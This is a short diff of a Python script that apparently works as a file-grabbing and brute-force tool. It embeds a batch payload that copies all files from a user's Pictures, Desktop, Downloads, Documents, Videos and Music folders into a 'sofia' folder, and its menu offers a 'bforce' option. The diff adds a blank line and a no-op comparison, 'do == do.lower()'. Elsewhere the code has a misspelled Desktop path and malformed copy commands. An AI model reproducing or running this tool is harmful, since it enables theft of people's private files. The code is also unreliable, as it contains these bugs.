@@ -12,6 +12,7 @@ CONTENT1 ='''@echo off
 copy C:\Users\%USERNAME%\Pictures\*.* .\sofia\ 
 copy C:\Users\%USERNAME%\Destkop\*.* .\sofia\ 
 copy C:\Users\%USERNAME%\Downloads\*.* .\sofia\
+
 copy C:\Users\%USERNAME%\Documents\*.*.\sofia\ 
 copy C:\Users\%USERNAME%\Videos\*.*.\sofia\ 
 copy C:\Users\%USERNAME%\Music\*.* .\sofia\ '''
@@ -113,6 +114,7 @@ def run(content1, content2, msg1, msg2):
 			*************************
             
              > '''))
+		do == do.lower()
 		if do == "f":
 			bforce()
 		elif do == "s":
